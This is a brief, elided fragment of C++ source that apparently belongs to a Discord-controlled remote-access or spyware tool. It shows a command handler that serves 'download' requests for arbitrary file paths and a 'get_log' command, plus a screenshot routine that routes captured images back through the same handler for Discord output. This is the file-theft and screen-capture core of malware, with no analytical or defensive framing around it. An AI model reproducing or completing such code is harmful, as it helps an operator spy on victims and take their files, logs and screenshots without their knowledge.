...
void HandleFileCommand(const std::string& command, std::string& response) {
    ...
    else if (command.length() > 8 && command.substr(0, 8) == "download" || command.length() > 7 && command.substr(0, 7) == "get_log") {
        
        std::string filename = (command.substr(0, 7) == "get_log") ? LOG_FILE_NAME : command.substr(9);
        std::string fullPath = (filename == LOG_FILE_NAME || filename == SCREENSHOT_FILE_NAME) ? GetTempFilePath(filename.c_str()) : filename;
...
void CaptureScreenshot(std::string& response) {
    ...
    HandleFileCommand(downloadCommand, response);
    
    // Add prefix for clarity in the Discord output
